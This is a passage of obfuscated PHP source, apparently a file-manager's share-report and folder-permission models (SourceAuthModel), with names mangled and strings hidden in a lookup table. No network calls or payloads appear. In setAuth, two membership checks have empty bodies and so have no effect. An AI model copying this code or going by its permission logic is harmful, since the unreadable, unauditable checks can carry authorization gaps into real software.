$†ÈÈ‹ŞÖ)); } if (isset($æ—òÉé[$‡…„Êè·[33]]) && in_array($æ—òÉé[$‡…„Êè·[33]], array($‡…„Êè·[88], $‡…„Êè·[446], $‡…„Êè·[2028], $‡…„Êè·[2029], $‡…„Êè·[2030]))) { $Ö ¬ºì¬[$‡…„Êè·[33]] = $æ—òÉé[$‡…„Êè·[33]]; } if (isset($æ—òÉé[$‡…„Êè·[756]]) && in_array($æ—òÉé[$‡…„Êè·[756]], array($‡…„Êè·[197], $‡…„Êè·[88], $‡…„Êè·[446], $‡…„Êè·[2028]))) { $Ö ¬ºì¬[$‡…„Êè·[756]] = $æ—òÉé[$‡…„Êè·[756]]; } $§î˜’Å¶ = Input::get($‡…„Êè·[467], $‡…„Êè·[7], $‡…„Êè·[2027], array($‡…„Êè·[1949], $‡…„Êè·[461])); $–Š»Ş¥Ù = array($‡…„Êè·[459] => $‡…„Êè·[460], $‡…„Êè·[461] => $‡…„Êè·[462]); $á“Õãä‚ = $‡…„Êè·[2031] . $–Š»Ş¥Ù[$§î˜’Å¶]; $œæÑ‡Ô¿ = Model($‡…„Êè·[2023])->where($Ö ¬ºì¬)->order($á“Õãä‚)->selectPage(20); if (empty($œæÑ‡Ô¿[$‡…„Êè·[378]])) { return array(); } $¢œ×³Ø = array_to_keyvalue_group($œæÑ‡Ô¿[$‡…„Êè·[378]], $‡…„Êè·[756], $‡…„Êè·[498]); if (!empty($¢œ×³Ø[0])) { $æ—òÉé = $¢œ×³Ø[0]; $Ö ¬ºì¬ = array($‡…„Êè·[498] => array($‡…„Êè·[7], $æ—òÉé)); $Ø­à²–à = $this->where($Ö ¬ºì¬)->field($‡…„Êè·[498])->select(); $Ø­à²–à = array_to_keyvalue($Ø­à²–à, $‡…„Êè·[12], $‡…„Êè·[498]); $ü ƒ‡ç = array_diff($æ—òÉé, $Ø­à²–à); if (!empty($ü ƒ‡ç)) { foreach ($œæÑ‡Ô¿[$‡…„Êè·[378]] as $¨İ “ù => $ÍÄÛ»©•) { if (in_array($ÍÄÛ»©•[$‡…„Êè·[498]], $ü ƒ‡ç)) { unset($œæÑ‡Ô¿[$‡…„Êè·[378]][$¨İ “ù]); } } } } $this->_listDataApply($œæÑ‡Ô¿[$‡…„Êè·[378]]); return $œæÑ‡Ô¿; } public function reportStatus($¨¤±øò¼) { $ŠÊ˜€Ü =& $_SERVER[Ü©»’·]; $˜øâ‚ = array($ŠÊ˜€Ü[408] => $¨¤±øò¼[$ŠÊ˜€Ü[408]]); $ÜÆçÁ¾µ = Model($ŠÊ˜€Ü[2023])->where($˜øâ‚)->field($ŠÊ˜€Ü[2032])->find(); if (!$ÜÆçÁ¾µ) { return !1; } $í„±ƒã = array($ŠÊ˜€Ü[756] => $¨¤±øò¼[$ŠÊ˜€Ü[756]]); if ($¨¤±øò¼[$ŠÊ˜€Ü[756]] == $ŠÊ˜€Ü[2028] && $ÜÆçÁ¾µ[$ŠÊ˜€Ü[756]] == $ŠÊ˜€Ü[2028]) { $í„±ƒã[$ŠÊ˜€Ü[756]] = 0; } $÷ì´ñ¶ = Model($ŠÊ˜€Ü[2023])->where($˜øâ‚)->save($í„±ƒã); if ($¨¤±øò¼[$ŠÊ˜€Ü[756]] == $ŠÊ˜€Ü[446]) { if ($ÜÆçÁ¾µ[$ŠÊ˜€Ü[477]] != $ŠÊ˜€Ü[197] && $this->shareFileMeta($ÜÆçÁ¾µ[$ŠÊ˜€Ü[477]])) { $this->shareFileMeta($ÜÆçÁ¾µ[$ŠÊ˜€Ü[477]], 0); } $this->remove($ÜÆçÁ¾µ[$ŠÊ˜€Ü[498]]); return !0; } if ($÷ì´ñ¶ && $¨¤±øò¼[$ŠÊ˜€Ü[756]] == $ŠÊ˜€Ü[2028]) { $ûÓØòÃ = $í„±ƒã[$ŠÊ˜€Ü[756]] == $ŠÊ˜€Ü[2028] ? 1 : 0; $this->shareFileMeta($ÜÆçÁ¾µ[$ŠÊ˜€Ü[477]], $ûÓØòÃ); $this->removeByFile($ÜÆçÁ¾µ[$ŠÊ˜€Ü[477]]); } return $÷ì´ñ¶; } private function removeByFile($ÂŠùÖˆ‘) { $£Ô¯®Ú =& $_SERVER[Ü©»’·]; $˜õğıüø = Model($£Ô¯®Ú[831])->where(array($£Ô¯®Ú[477] => $ÂŠùÖˆ‘))->field($£Ô¯®Ú[411])->select(); $Áûş„© = array_to_keyvalue($˜õğıüø, $£Ô¯®Ú[12], $£Ô¯®Ú[411]); $íÉ®¬³ˆ = array($£Ô¯®Ú[411] => array($£Ô¯®Ú[7], $Áûş„©), $£Ô¯®Ú[503] => 1); $˜õğıüø = $this->where($íÉ®¬³ˆ)->field($£Ô¯®Ú[498])->select(); if (empty($˜õğıüø)) { return; } $·Ü¶ïÈ¤ = array_to_keyvalue($˜õğıüø, $£Ô¯®Ú[12], $£Ô¯®Ú[498]); $this->remove($·Ü¶ïÈ¤); } private function shareFileMeta($ö—´¨ª´, $ÖŠåõùë = null) { $âÉ§ŒÃ =& $_SERVER[Ü©»’·]; $íñÈÖ€ = array($âÉ§ŒÃ[477] => $ö—´¨ª´, $âÉ§ŒÃ[94] => $âÉ§ŒÃ[2033]); if (is_null($ÖŠåõùë)) { return Model($âÉ§ŒÃ[2034])->where($íñÈÖ€)->find(); } $íñÈÖ€[$âÉ§ŒÃ[383]] = $ÖŠåõùë; Model($âÉ§ŒÃ[2034])->add($íñÈÖ€, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\x75\162\x63\145\x5f\141\165\164\150"; public function getAuth($œòÔêê) { $ŒğÂºğš =& $_SERVER[Ü©»’·]; $×±´× = $this->sourceAuthSelect($œòÔêê); $Úí£ŠÁ = array(); $”´Ğ‹‰à = array(); $‹û×›àÒ = 2 << 25; foreach ($×±´× as $×™Ì¤Ãµ) { $Ï¾¼˜âğ = Model($ŒğÂºğš[516])->listData($×™Ì¤Ãµ[$ŒğÂºğš[1962]]); if (!$Ï¾¼˜âğ) { continue; } $Úí£ŠÁ[] = $×™Ì¤Ãµ; $ÅÓ’©Ïò = 0; if ($×™Ì¤Ãµ[$ŒğÂºğš[420]] == SourceModel::TYPE_GROUP) { $ÅÓ’©Ïò = $‹û×›àÒ * 2; } if ($×™Ì¤Ãµ[$ŒğÂºğš[420]] == SourceModel::TYPE_USER) { $ÅÓ’©Ïò = $‹û×›àÒ; } if ($×™Ì¤Ãµ[$ŒğÂºğš[420]] == SourceModel::TYPE_USER && $×™Ì¤Ãµ[$ŒğÂºğš[514]] == $ŒğÂºğš[197]) { $ÅÓ’©Ïò = 0; } $”´Ğ‹‰à[] = $Ï¾¼˜âğ[$ŒğÂºğš[422]] + $ÅÓ’©Ïò; } array_multisort($”´Ğ‹‰à, SORT_DESC, $Úí£ŠÁ); return $Úí£ŠÁ; } public function sourceAuthSelect($ıŠ·øÄğ) { $¡³Ó¸Ãö =& $_SERVER[Ü©»’·]; static $‹‡ñ‚¬ = array(); $©äÀ·ÛÄ = is_array($ıŠ·øÄğ) ? !1 : !0; if ($©äÀ·ÛÄ) { $ıŠ·øÄğ = array($ıŠ·øÄğ); } $æÒ‹ãĞ = array(); foreach ($ıŠ·øÄğ as $¯²¤û©¿) { if (isset($‹‡ñ‚¬[$¯²¤û©¿])) { $æÒ‹ãĞ[$¯²¤û©¿] = $‹‡ñ‚¬[$¯²¤û©¿]; } } if (count($æÒ‹ãĞ) == count($ıŠ·øÄğ)) { return $©äÀ·ÛÄ ? $æÒ‹ãĞ[$ıŠ·øÄğ[0]] : $æÒ‹ãĞ; } $‘Òù¶Ú© = $¡³Ó¸Ãö[2035]; $ÀÕ†çŒÏ = array($¡³Ó¸Ãö[411] => array($¡³Ó¸Ãö[7], $ıŠ·øÄğ)); $æÕ£ˆè = $this->field($‘Òù¶Ú©)->order($¡³Ó¸Ãö[408])->where($ÀÕ†çŒÏ)->select(); $šæŞ„ÓÒ = array_to_keyvalue_group($æÕ£ˆè, $¡³Ó¸Ãö[411]); foreach ($ıŠ·øÄğ as $¯²¤û©¿) { $‹‡ñ‚¬[$¯²¤û©¿] = $šæŞ„ÓÒ[$¯²¤û©¿] ? $šæŞ„ÓÒ[$¯²¤û©¿] : array(); } if ($©äÀ·ÛÄ) { return $æÕ£ˆè; } return $šæŞ„ÓÒ; } public function setAuth($ñ·ì» —, $ŸË¤È¯ê) { $Åá¡‡í° =& $_SERVER[Ü©»’·]; $Àç“†ŸÔ = Model($Åá¡‡í°[1339])->sourceInfo($ñ·ì» —); if (!$Àç“†ŸÔ) { return !1; } if ($Àç“†ŸÔ[$Åá¡‡í°[420]] != SourceModel::TYPE_GROUP) { return !1; } $”ªÈ•†ê = 1; $ ù™ºá· = $Àç“†ŸÔ[$Åá¡‡í°[514]]; if ($ ù™ºá· != $”ªÈ•†ê) { $Â£ÀÒ† = array($Åá¡‡í°[1858] => $ ù™ºá·); $¶¥Î‚ñ“ = Model($Åá¡‡í°[1948])->field($Åá¡‡í°[1669])->where($Â£ÀÒ†)->select(); $¶¥Î‚ñ“ = array_to_keyvalue($¶¥Î‚ñ“, $Åá¡‡í°[12], $Åá¡‡í°[1669]); } $åÅã½ ú = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¬ÁÊÆ½ö = array(); foreach ($ŸË¤È¯ê as $î¥ø«çû) { if (!in_array($î¥ø«çû[$Åá¡‡í°[420]], $åÅã½ ú)) { show_json(LNG($Åá¡‡í°[2036]), !1); } if ($ ù™ºá· != $”ªÈ•†ê) { if ($î¥ø«çû[$Åá¡‡í°[420]] == SourceModel::TYPE_GROUP) { } if ($î¥ø«çû[$Åá¡‡í°[514]] != 0 && !in_array($î¥ø«çû[$Åá¡‡í°[514]], $¶¥Î‚ñ“)) { } } if ($î¥ø«çû[$Åá¡‡í°[514]] == 0) { $î¥ø«çû[$Åá¡‡í°[420]] = SourceModel::TYPE_USER; } $¬ÁÊÆ½ö[] = array($Åá¡‡í°[411] => $ñ·ì» —, $Åá¡‡í°[420] => intval($î¥ø«çû[$Åá¡‡í°[420]]), $Åá¡‡í°[514] => intval($î¥ø«çû[$Åá¡‡í°[514]]), $Åá¡‡í°[1962] => intval($î¥ø«çû[$Åá¡‡í°[1962]]) ? intval($î¥ø«çû[$Åá¡‡í°[1962]]) : 0, $Åá¡‡í°[2018] => intval($î¥ø«çû[$Åá¡‡í°[2018]]) ? intval($î¥ø«çû[$Åá¡‡í°[2018]]) : -1); } $this->where(array($Åá¡‡í°[426] => $ñ·ì» —))->delete(); $this->addAll($¬ÁÊÆ½ö); return !0; } public function authClear($¼óÆ“’Ã) { $Æñ—ÈÌê =& $_SERVER[Ü©»’·]; $Äª±ŒÒ¿ = Model($Æñ—ÈÌê[1339])->sourceInfo($¼óÆ“’Ã); $ü’ÜĞ™ = array($¼óÆ“’Ã); if ($Äª±ŒÒ¿[$Æñ—ÈÌê[419]] == $Æñ—ÈÌê[88]) { $ëæò³ÏÙ = array($Æñ—ÈÌê[599] => array($Æñ—ÈÌê[559], $Äª±ŒÒ¿[$Æñ—ÈÌê[530]] . $¼óÆ“’Ã . $Æñ—ÈÌê[560])); $ü’ÜĞ™ = Model($Æñ—ÈÌê[1339])->field($Æñ—ÈÌê[426])->where($ëæò³ÏÙ)->getField($Æñ—ÈÌê[411], !0); $ü’ÜĞ™[] = $¼óÆ“’Ã; } $this->where(array($Æñ—ÈÌê[426] => array($Æñ—ÈÌê[427], $ü’ÜĞ™)))->delete(); return !0; } public function getAllChildren($†±ãÔş÷) { $ÑîÚ‰¡ =& $_SERVER[Ü©»’·]; $ˆ”“èŞ = Model($ÑîÚ‰¡[1339])->sourceInfo($†±ãÔş÷); if ($ˆ”“èŞ[$ÑîÚ‰¡[419]] != $ÑîÚ‰¡[88]) { return $this->sourceListAuth(array($†±ãÔş÷)); } if ($ˆ”“èŞ[$ÑîÚ‰¡[420]] != SourceModel::TYPE_GROUP) { return array(); } $Ì¡î†çÌ = 1; $’êæ¤Éà = array($†±ãÔş÷); if ($ˆ”“èŞ[$ÑîÚ‰¡[441]] == $ÑîÚ‰¡[197] && $ˆ”“èŞ[$ÑîÚ‰¡[514]] != $Ì¡î†çÌ) { $’êæ¤Éà = $this->groupChidldAllRootSource($ˆ”“èŞ[$ÑîÚ‰¡[514]]); } $Ù¶ğëÓı = $this->field($ÑîÚ‰¡[411])->group($ÑîÚ‰¡[411])->select(); $Ù¶ğëÓı = array_to_keyvalue($Ù¶ğëÓı, $ÑîÚ‰¡[12], $ÑîÚ‰¡[411]); if (!$Ù¶ğëÓı) { return array(); } $µé·ú¹ = $ÑîÚ‰¡[2037]; $©¯à÷ß = array($ÑîÚ‰¡[411] => array($ÑîÚ‰¡[7], $Ù¶ğëÓı), $ÑîÚ‰¡[440] => $ÑîÚ‰¡[197]); $²Ş½«ïĞ = Model($ÑîÚ‰¡[831])->field($µé·ú¹)->where($©¯à÷ß)->select(); $ˆ¶ï®ëÈ = array($†±ãÔş÷); foreach ($²Ş½«ïĞ as $ŒÊÀìÄ”) { foreach ($’êæ¤Éà as $€ŞÌòÇú) { $Ü‚Şá = $ÑîÚ‰¡[50] . $€ŞÌòÇú . $ÑîÚ‰¡[50]; $ÕŸ€î‘à = $ŒÊÀìÄ”[$ÑîÚ‰¡[530]] . $ŒÊÀìÄ”[$ÑîÚ‰¡[411]] . $ÑîÚ‰¡[50]; if (strstr($ÕŸ€î‘à, $Ü‚Şá)) { $ˆ¶ï®ëÈ[] = $ŒÊÀìÄ”[$ÑîÚ‰¡[411]]; break; } } } return $this->sourceListAuth($ˆ¶ï®ëÈ); } private function sourceListAuth($ì›½Ç…å) { $éˆÎ–ø÷ =& $_SERVER[Ü©»’·]; $ÕÊÉ£® = Model($éˆÎ–ø÷[1339])->sourceListInfo($ì›½Ç…å, !0); $ƒÓÆâš = $this->sourceAuthSelect($ì›½Ç…å); $Î³…ÁÔß = array(); $‚Ğâ©˜ = array(); foreach ($ÕÊÉ£® as $ºÏİŠ´Ô) { unset($ºÏİŠ´Ô[$éˆÎ–ø÷[465]]); unset($ºÏİŠ´Ô[$éˆÎ–ø÷[463]]); unset($ºÏİŠ´Ô[$éˆÎ–ø÷[422]]); unset($ºÏİŠ´Ô[$éˆÎ–ø÷[86]]); $²”ŸÙüÓ = $ƒÓÆâš[$ºÏİŠ´Ô[$éˆÎ–ø÷[411]]]; if (!$²”ŸÙüÓ) { continue; } $ºÏİŠ´Ô[$éˆÎ–ø÷[2038]] = $this->authTargetInfo($²”ŸÙüÓ); $ºÏİŠ´Ô[$éˆÎ–ø÷[528]] = rtrim($ºÏİŠ´Ô[$éˆÎ–ø÷[534]], $éˆÎ–ø÷[8]) . $éˆÎ–ø÷[8] . ltrim($ºÏİŠ´Ô[$éˆÎ–ø÷[528]], $éˆÎ–ø÷[8]); $Î³…ÁÔß[] = $ºÏİŠ´Ô; $âòü˜¥„ = count(explode($éˆÎ–ø÷[8], trim($ºÏİŠ´Ô[$éˆÎ–ø÷[528]], $éˆÎ–ø÷[8]))); $‚Ğâ©˜[] = $âòü˜¥„ + ($ºÏİŠ´Ô[$éˆÎ–ø÷[33]] == $éˆÎ–ø÷[75] ? 0 : 1000); } array_multisort($‚Ğâ©˜, SORT_ASC, $Î³…ÁÔß); return $Î³…ÁÔß; } private function groupChidldAllRootSource($‰àíåø) { $÷ø²â¼ =& $_SERVER[Ü©»’·]; $ò«Óšı¯ = Model($÷ø²â¼[2039])->groupChildrenAll($‰àíåø); $´öà¸â³ = array($÷ø²â¼[441] => 0, $÷ø²â¼[514] => array($÷ø²â¼[7], $ò«Óšı¯), $÷ø²â¼[420] => SourceModel::TYPE_GROUP); $Şâ·ıÏñ = Model($÷ø²â¼[831])->field($÷ø²â¼[411])->where($´öà¸â³)->select(); $Şâ·ıÏñ = array_to_keyvalue($Şâ·ıÏñ, $÷ø²â¼[12], $÷ø²â¼[411]); return $Şâ·ıÏñ; } private function authTargetInfo($ù¤Ë…Ä) { $À§äÇ˜£ =& $_SERVER[Ü©»’·]; $í¶¼Ìá‡ = array(); $Ñƒ½ñ = array(); $ùâ—«Üã = 2 << 25; foreach ($ù¤Ë…Ä as $ï¬©Ó§) { $Ì¦ØÁ¬ = Model($À§äÇ˜£[516])->listData($ï¬©Ó§[$À§äÇ˜£[1962]]); if (!$Ì¦ØÁ¬) { continue; } if ($ï¬©Ó§[$À§äÇ˜£[420]] == SourceModel::TYPE_USER) { $î„ìİÃ = Model($À§äÇ˜£[522])->getInfoSimpleOuter($ï¬©Ó§[$À§äÇ˜£[514]]); if ($î„ìİÃ[$À§äÇ˜£[1669]] == $À§äÇ˜£[1192]) { continue; } if ($î„ìİÃ[$À§äÇ˜£[1669]] == $À§äÇ˜£[197]) { $î„ìİÃ[$À§äÇ˜£[32]] = LNG($À§äÇ˜£[2040]); } } else { $î„ìİÃ = Model($À§äÇ˜£[531])->getInfoSimple($ï¬©Ó§[$À§äÇ˜£[514]]); } if (!$î„ìİÃ) { continue; } $î„ìİÃ[$À§äÇ˜£[476]] = $Ì¦ØÁ¬; $í¶¼Ìá‡[] = $î„ìİÃ; $Ê­¥ªÏğ = 0; if ($ï¬©Ó§[$À§äÇ˜£[420]] == SourceModel::TYPE_GROUP) { $Ê­¥ªÏğ = $ùâ—«Üã * 2; } if ($ï¬©Ó§[$À§äÇ˜£[420]] == SourceModel::TYPE_USER) { $Ê­¥ªÏğ = $ùâ—«Üã; } if ($ï¬©Ó§[$À§äÇ˜£[420]] == SourceModel::TYPE_USER && $ï¬©Ó§[$À§äÇ˜£[514]] == $À§äÇ˜£[197]) { $Ê­¥ªÏğ = 0; } $Ñƒ½ñ[] = $Ì¦ØÁ¬[$À§äÇ˜£[422]] + $Ê­¥ªÏğ; } array_multisort($Ñƒ½ñ, SORT_DESC, $í¶¼Ìá‡); return $í¶¼Ìá‡; } public function getAllChildrenByUser($¾­Êœõ¹, $·Î±‘Í¥) { $¯Ó–ıí =& $_SERVER[Ü©»’·]; $İ Å‚úÆ = Model($¯Ó–ıí[544])->getInfo($·Î±‘Í¥); if (!$·Î±‘Í¥ || !$¾­Êœõ¹ || !$İ Å‚úÆ) { return array(); } $ÊêÂ¨Ã¦ = Model($¯Ó–ıí[1339])->sourceInfo($¾­Êœõ¹); $³…Ï©Ğ• = array(); $ìã•óÆ = 1; if ($ÊêÂ¨Ã¦[$¯Ó–ıí[441]] == $¯Ó–ıí[197] && $ÊêÂ¨Ã¦[$¯Ó–ıí[514]] != $ìã•óÆ && $this->groupContainUser($ÊêÂ¨Ã¦[$¯Ó–ıí[514]], $·Î±‘Í¥)) { foreach ($İ Å‚úÆ[$¯Ó–ıí[2041]] as $²åù’à) { $ÂÔ®ü¦å = Model($¯Ó–ıí[531])->getInfo($²åù’à[$¯Ó–ıí[1858]]); $ ¡õ†ŒÑ = Model($¯Ó–ıí[544])->getInfoSimpleOuter($·Î±‘Í¥); $ ¡õ†ŒÑ[$¯Ó–ıí[476]] = $²åù’à[$¯Ó–ıí[422]]; if (Model($¯Ó–ıí[516])->authCheckAction($²åù’à[$¯Ó–ıí[422]][$¯Ó–ıí[422]], $¯Ó–ıí[1879])) { continue; } $²­ü¹ƒµ = array($¯Ó–ıí[32] => $¯Ó–ıí[1212] . $ÂÔ®ü¦å[$¯Ó–ıí[32]], $¯Ó–ıí[411] => $ÂÔ®ü¦å[$¯Ó–ıí[86]][$¯Ó–ıí[411]], $¯Ó–ıí[84] => KodIO::make($ÂÔ®ü¦å[$¯Ó–ıí[86]][$¯Ó–ıí[411]]), $¯Ó–ıí[441] => $¯Ó–ıí[197], $¯Ó–ıí[420] => $¯Ó–ıí[524], $¯Ó–ıí[33] => $¯Ó–ıí[563], $¯Ó–ıí[528] => $ÂÔ®ü¦å[$¯Ó–ıí[535]], $¯Ó–ıí[1858] => $ÂÔ®ü¦å[$¯Ó–ıí[1858]], $¯Ó–ıí[532] => $ÂÔ®ü¦å[$¯Ó–ıí[441]], $¯Ó–ıí[2038] => array($ ¡õ†ŒÑ)); $³…Ï©Ğ•[$²­ü¹ƒµ[$¯Ó–ıí[411]]] = $²­ü¹ƒµ; } } $¢©ôŸàİ = array(); $ÄÜş¨¥’ = $this->getAllChildren($¾­Êœõ¹); foreach ($ÄÜş¨¥’ as $ÈÛÒŒÃÜ) { $›Ô°¦‰ = !1; foreach ($ÈÛÒŒÃÜ[$¯Ó–ıí[2038]] as $ÁàúÔ‚ô) { if ($ÁàúÔ‚ô[$¯Ó–ıí[1669]]) { if ($ÁàúÔ‚ô[$¯Ó–ıí[1669]] == $·Î±‘Í¥) { $›Ô°¦‰ = !0; break; } } if ($ÁàúÔ‚ô[$¯Ó–ıí[1858]]) { if ($this->groupContainUser($ÁàúÔ‚ô[$¯Ó–ıí[1858]], $·Î±‘Í¥)) { $›Ô°¦‰ = !0; break; } } } if ($›Ô°¦‰) { $¢©ôŸàİ[] = $ÈÛÒŒÃÜ; } $ÈÒĞ„Ñ… = $ÈÛÒŒÃÜ[$¯Ó–ıí[411]]; if (isset($³…Ï©Ğ•[$ÈÒĞ„Ñ…])) { $ÈÛÒŒÃÜ[$¯Ó–ıí[2038]][] = $³…Ï©Ğ•[$ÈÒĞ„Ñ…][0]; $³…Ï©Ğ•[$ÈÒĞ„Ñ…] = !1; } } $³…Ï©Ğ• = array_filter(array_values($³…Ï©Ğ•)); $¢©ôŸàİ = array_merge($³…Ï©Ğ•, $¢©ôŸàİ); return $¢©ôŸàİ; } public function setAllChildrenByUser($¸ÂÁ¦ÕŞ, $ÕßÜÍ…, $Õ¼®²àÃ) { $ç¡¡ş¿ =& $_SERVER[Ü©»’·]; $»ÃÇßÇ = $this->getAllChildrenByUser($¸ÂÁ¦ÕŞ, $ÕßÜÍ…); if (!$Õ¼®²àÃ || !$»ÃÇßÇ) { return !1; } foreach ($»ÃÇßÇ as $º…ä”Ë) { $ƒÉ„ı’Ñ = array(); foreach ($º…ä”Ë[$ç¡¡ş¿[2038]] as $Ş’‰Áø) { $Œ«ÎÅ§ë = $Ş’‰Áø[$ç¡¡ş¿[476]]; $ÊØ¡±ê = $Ş’‰Áø[$ç¡¡ş¿[1669]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $£õµ†Û­ = $Ş’‰Áø[$ç¡¡ş¿[1669]] ? $Ş’‰Áø[$ç¡¡ş¿[1669]] : $Ş’‰Áø[$ç¡¡ş¿[1858]]; if ($Ş’‰Áø[$ç¡¡ş¿[1669]] && $Ş’‰Áø[$ç¡¡ş¿[1669]] == $ÕßÜÍ…) { continue; } $ƒÉ„ı’Ñ[] = array($ç¡¡ş¿[411] => $º…ä”Ë[$ç¡¡ş¿[411]], $ç¡¡ş¿[420] => $ÊØ¡±ê, $ç¡¡ş¿[514] => intval($£õµ†Û­), $ç¡¡ş¿[1962] => isset($Œ«ÎÅ§ë[$ç¡¡ş¿[408]]) ? intval($Œ«ÎÅ§ë[$ç¡¡ş¿[408]]) : 0, $ç¡¡ş¿[2018] => isset($Œ«ÎÅ§ë[$ç¡¡ş¿[2018]]) ? intval($Œ«ÎÅ§ë[$ç¡¡ş¿[2018]]) : -1); } $ƒÉ„ı’Ñ[] = array($ç¡¡ş¿[411] => $º…ä”Ë[$ç¡¡ş¿[411]], $ç¡¡ş¿[420] => SourceModel::TYPE_USER, $ç¡¡ş¿[514] => intval($ÕßÜÍ…), $ç¡¡ş¿[1962] => intval($Õ¼®²àÃ), $ç¡¡ş¿[2018] => -1); $this->where(array($ç¡¡ş¿[426] => $º…ä”Ë[$ç¡¡ş¿[411]]))->delete(); $this->addAll($ƒÉ„ı’Ñ); } return !0; } public function get($€ŞÓ¨€) { $Ï•³’óƒ = $this->getSourceList(array($€ŞÓ¨€), !0); return $Ï•³’óƒ[0]; } public function getSourceList($°¹·Ğ¥, $™Èö¸—ì = false, $ïËïáàÏ = false) { $¶Ãø¦¨Õ =& $_SERVER[Ü©»’·]; if (!$°¹·Ğ¥) { return array(); } $…ğšŞˆŒ = Model($¶Ãø¦¨Õ[1339]); if (!$™Èö¸—ì && count($°¹·Ğ¥) == 1) { $™Èö¸—ì = array(); $™Èö¸—ì[$°¹·Ğ¥[0]] = $…ğšŞˆŒ->sourceInfo($°¹·Ğ¥[0]); } if (!$™Èö¸—ì) { $Á»©Õ¡ = array($¶Ãø¦¨Õ[426] => array($¶Ãø¦¨Õ[427], $°¹·Ğ¥)); $™Èö¸—ì = $…ğšŞˆŒ->field($¶Ãø¦¨Õ[2042])->where($Á»©Õ¡)->select(); $™Èö¸—ì = array_to_keyvalue($™Èö¸—ì, $¶Ãø¦¨Õ[411]); } $“ûéÇØÜ = $°¹·Ğ¥; foreach ($™Èö¸—ì as $ñŸçÁÒƒ => $î©×½Èü) { $Ï¡“ê»’ = $…ğšŞˆŒ->parentLevelArray($î©×½Èü[$¶Ãø¦¨Õ[530]]); $“ûéÇØÜ = array_merge($“ûéÇØÜ, array($ñŸçÁÒƒ), array_reverse($Ï¡“ê»’)); } $“ûéÇØÜ = array_values(array_unique($“ûéÇØÜ)); if (!$“ûéÇØÜ) { return array(); } $€­¬é¡ = $this->sourceAuthSelect($“ûéÇØÜ); $£Öª†–Í = array(); foreach ($“ûéÇØÜ as $œºóÏ·†) { if (isset($€­¬é¡[$œºóÏ·†])) { $£Öª†–Í[$œºóÏ·†] = $€­¬é¡[$œºóÏ·†]; } } $©Àè¼¿˜ = $this->userIsRoot($ïËïáàÏ); $†­¯ÄéĞ = AuthModel::authAll(); $’Ò³üŒõ = array($¶Ãø¦¨Õ[423] => $†­¯ÄéĞ, $¶Ãø¦¨Õ[2043] => array($¶Ãø¦¨Õ[428] => 0, $¶Ãø¦¨Õ[1864] => $†­¯ÄéĞ, $¶Ãø¦¨Õ[429] => LNG($¶Ãø¦¨Õ[2044]), $¶Ãø¦¨Õ[1881] => $¶Ãø¦¨Õ[2045])); $çÏƒ“İÓ = array(); foreach ($™Èö¸—ì as $œºóÏ·† => $­©™œÃ) { if ($©Àè¼¿˜ && $GLOBALS[$¶Ãø¦¨Õ[6]][$¶Ãø¦¨Õ[1877]]) { $çÏƒ“İÓ[$œºóÏ·†] = $’Ò³üŒõ; continue; } $çÏƒ“İÓ[$œºóÏ·†] = $this->makeSourceAuth($­©™œÃ, $£Öª†–Í, $ïËïáàÏ); } return $çÏƒ“İÓ; } public function authDeepCheck($Æµ³¸šı, $ùÜúû·¡ = false) { $‰™Ë„±Œ =& $_SERVER[Ü©»’·]; $ùÜúû·¡ = $ùÜúû·¡ ? $ùÜúû·¡ : USER_ID; $ß¾œ¦É´ = $this->makeAuthDeep($ùÜúû·¡); if (!in_array($Æµ³¸šı, $ß¾œ¦É´[$‰™Ë„±Œ[2046]])) { return !1; } $¬ûéïÔ˜ = array(); foreach ($ß¾œ¦É´[$‰™Ë„±Œ[2047]] as $½ÕƒÆí => $­ÌÈ’ˆì) { if (!in_array($Æµ³¸šı, $­ÌÈ’ˆì)) { continue; } $¬ûéïÔ˜[] = $½ÕƒÆí; } if (!$¬ûéïÔ˜) { return !1; } $ªå×¥Á© = $¬ûéïÔ˜ ? $¬ûéïÔ˜[0] : $Æµ³¸šı; return array($‰™Ë„±Œ[423] => -1, $‰™Ë„±Œ[476] => array($‰™Ë„±Œ[428] => $‰™Ë„±Œ[1192], $‰™Ë„±Œ[1864] => $‰™Ë„±Œ[197], $‰™Ë„±Œ[429] => LNG($‰™Ë„±Œ[2048]), $‰™Ë„±Œ[1881] => $‰™Ë„±Œ[2049]), $‰™Ë„±Œ[2050] => LNG($‰™Ë„±Œ[2051]), $‰™Ë„±Œ[2052] => $this->sourceAuthInfo($ªå×¥Á©)); } protected function makeAuthDeep($»¢¡ã¡ö = false) { $©Ô§£ğµ =& $_SERVER[Ü©»’·]; static $úğ¿ƒ¢Ú = array(); $»¢¡ã¡ö = $»¢¡ã¡ö ? $»¢¡ã¡ö : USER_ID; if (isset($úğ¿ƒ¢Ú[$»¢¡ã¡ö])) { return $úğ¿ƒ¢Ú[$»¢¡ã¡ö]; } $ú·¾œ¦¦ = Model($©Ô§£ğµ[2053])->listData(); $‚ÜÃˆÏ« = array(); foreach ($ú·¾œ¦¦ as $ê¢®ŞÁ³) { if ($ê¢®ŞÁ³[$©Ô§£ğµ[422]] == 0 && $ê¢®ŞÁ³[$©Ô§£ğµ[1880]] == $©Ô§£ğµ[88]) { $‚ÜÃˆÏ«[] = $ê¢®ŞÁ³[$©Ô§£ğµ[408]]; } } $õ¸˜Ìï˜ = $this->userGroupParents($»¢¡ã¡ö); $§Ğ¼‘¼Ï = array($©Ô§£ğµ[420] => SourceModel::TYPE_USER, $©Ô§£ğµ[514] => $»¢¡ã¡ö); if ($õ¸˜Ìï˜) { $§Ğ¼‘¼Ï = array(array($©Ô§£ğµ[420] => SourceModel::TYPE_USER, $©Ô§£ğµ[514] => $»¢¡ã¡ö), array($©Ô§£ğµ[420] => SourceModel::TYPE_GROUP, $©Ô§£ğµ[514] => array($©Ô§£ğµ[427], $õ¸˜Ìï˜)), $©Ô§£ğµ[1003] => $©Ô§£ğµ[1956]); } $ œíÈ—ƒ = $this->field($©Ô§£ğµ[2054])->where($§Ğ¼‘¼Ï)->select(); $‹©àö— = array(); $µ¼±É‚¹ = array_to_keyvalue_group($ œíÈ—ƒ, $©Ô§£ğµ[411]); foreach ($µ¼±É‚¹ as $®•Üúû¼ => $«–É™–) { $·§€øÚ« = $this->authArrayCheck($«–É™–, $»¢¡ã¡ö); if ($·§€øÚ«[$©Ô§£ğµ[423]] > 0) { $‹©àö—[] = $®•Üúû¼ . $©Ô§£ğµ[12]; } } if ($õ¸˜Ìï˜) { $à¦˜ë” = Model($©Ô§£ğµ[531]); foreach ($õ¸˜Ìï˜ as 